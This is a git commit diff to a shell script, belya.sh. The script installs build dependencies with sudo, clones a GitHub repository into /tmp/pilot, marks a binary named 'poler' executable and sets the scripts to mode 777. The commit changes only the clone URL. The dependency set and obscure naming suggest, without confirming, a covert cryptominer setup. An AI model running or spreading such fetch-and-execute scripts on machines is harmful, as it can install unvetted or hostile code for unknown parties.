64c6ca35aa3acde1c5ebe38d88e8d19f401ab8a7
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-14 23:00:46 +0300

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -8,7 +8,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir pilot
-git clone https://github.com/furfurbur/pilot.git /tmp/pilot
+git clone https://github.com/robbertopp1/pilot1 /tmp/pilot
 cd /tmp/pilot
 chmod +x /tmp/pilot/poler
 chmod 777 ./*.sh
